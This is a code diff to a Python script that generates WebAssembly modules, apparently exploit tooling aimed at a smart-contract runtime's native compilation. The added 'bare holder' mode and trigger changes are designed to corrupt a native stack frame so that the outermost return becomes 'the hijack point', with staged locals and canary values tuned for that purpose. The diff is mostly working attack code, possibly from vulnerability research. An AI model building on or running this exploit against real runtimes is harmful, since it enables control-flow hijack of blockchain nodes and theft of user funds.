@@ -48,8 +48,59 @@ ALLOCATOR = """  (global $heap (mut i32) (i32.const 8192))
   (func (export "interface_version_8"))"""
 
 
-def gen_holder(outdir, dummy=0, staged=10, staged_const=None):
+def gen_holder(outdir, dummy=0, staged=10, staged_const=None, bare=False):
     req = ('{"wasm":{"smart":{"contract_addr":"%s","msg":"e30="}}}' % TRIGGER_ADDR).encode()
+    if bare:
+        # BARE holder: same staged-local frame shape as the hit-reporting holder (locals live
+        # across the query -> registers/spills), but the post-query path touches ONLY the locals
+        # with register ops (i64.xor folds) -- no memory access, so no OOB trap; the function then
+        # reaches its epilogue and the outermost `ret` consumes the corrupted top-frame slot.
+        N = staged
+        if staged_const is not None:
+            staged_vals = [
+                ("(i64.or (i64.const 0x%x) (i64.and (i64.extend_i32_u (local.get $env)) (i64.const 0)))" % staged_const)
+                for _ in range(N)
+            ]
+        else:
+            staged_vals = [
+                "(i64.or (i64.shl (i64.extend_i32_u (local.get $env)) (i64.const 32)) (i64.const 0x%04x))"
+                % (0x1000 + i)
+                for i in range(N)
+            ]
+        xor_fold = staged_vals[0].replace("(local.get $env)", "(local.get $env)")
+        # register-only fold over the staged locals after the query (keeps them live across it)
+        fold = "(local.get $l0)"
+        for k in range(1, N):
+            fold = f"(i64.xor {fold} (local.get $l{k}))"
+        lines = [
+            ";; BARE holder (generated): minimal post-query path (no memory access).",
+            "(module",
+            '  (import "env" "query_chain" (func $query (param i32) (result i32)))',
+            '  (memory (export "memory") 1)',
+            ALLOCATOR,
+            "  ;; @16 request region; @32 fixed-response region",
+            f'  (data (i32.const 16) "{esc(region(64, 256, len(req)))}")',
+            f'  (data (i32.const 64) "{esc(req)}")',
+            f'  (data (i32.const 32) "{esc(region(512, 64, len(RESP)))}")',
+            f'  (data (i32.const 512) "{esc(RESP)}")',
+            '  (func (export "instantiate") (param i32 i32 i32) (result i32) (i32.const 32))',
+            f'  (func (export "execute") (export "query") (param $env i32) (param $msg i32) (result i32)',
+            "    " + " ".join(f"(local $l{k} i64)" for k in range(N)),
+        ]
+        for k in range(N):
+            lines.append(f"    (local.set $l{k} {staged_vals[k]})")
+        lines += [
+            "    (drop (call $query (i32.const 16)))",
+            f"    (drop {fold})",
+            "    (i32.const 32))",
+            '  (func (export "migrate") (param i32 i32 i32) (result i32) (i32.const 32))',
+            '  (func (export "sudo") (param i32 i32 i32 i32) (result i32) (i32.const 32))',
+            '  (func (export "reply") (param i32 i32 i32) (result i32) (i32.const 32))',
+            ")",
+            "",
+        ]
+        open(os.path.join(outdir, "holder.wat"), "w").write("\n".join(lines))
+        return
     # staged locals; more locals => more spill pressure => a REAL native frame growth
     # (the resume slot moves deeper, out of the guard-protected top window)
     N = staged
@@ -223,10 +274,12 @@ def gen_trigger(outdir, offset, iters, dense=False, live="load", plants="uniform
             f"        (if (then (call $host {call_arg}) drop))",
         ]
     else:
-        if spacing == 512:
-            cond = f"(i32.eqz (i32.and (i32.add (local.get $i) (i32.const {offset})) (i32.const 511)))"
+        n_off = spacing - (offset % spacing) if offset % spacing else 0
+        if spacing & (spacing - 1) == 0:
+            # power-of-two spacing: keep the AND-mask code shape (the drift-triggering shape)
+            cond = (f"(i32.eqz (i32.and (i32.add (local.get $i) (i32.const {n_off})) "
+                    f"(i32.const {spacing - 1})))")
         else:
-            n_off = spacing - (offset % spacing) if offset % spacing else 0
             cond = (f"(i32.eqz (i32.rem_u (i32.add (local.get $i) (i32.const {n_off})) "
                     f"(i32.const {spacing})))")
         lines += [
@@ -300,6 +353,8 @@ def main():
                     help="number of holder staged locals (more => forced native frame growth)")
     ap.add_argument("--plant-values", default=None,
                     help="comma-separated per-slot canary values (hex), overrides --plants")
+    ap.add_argument("--bare-holder", action="store_true",
+                    help="bare holder: minimal post-query path (the corrupted outermost ret is the hijack point)")
     ap.add_argument("--spacing", type=int, default=512,
                     help="host-call spacing in iterations (drift stride = 16*spacing bytes; default 512 = 8 KiB)")
     ap.add_argument("--staged-const", default=None,
@@ -312,7 +367,7 @@ def main():
     pv = [int(x, 16) for x in args.plant_values.split(",")] if args.plant_values else None
     tv = int(args.then_val, 16) if args.then_val else None
     sc = int(args.staged_const, 16) if args.staged_const else None
-    gen_holder(args.outdir, args.dummy, args.staged, sc)
+    gen_holder(args.outdir, args.dummy, args.staged, sc, args.bare_holder)
     gen_trigger(args.outdir, args.offset, args.iters, args.dense, args.live, args.plants,
                 args.plant_addr, args.dense_tail, args.frame32, call_kind, pv, tv, args.spacing)
     gen_benign(args.outdir)
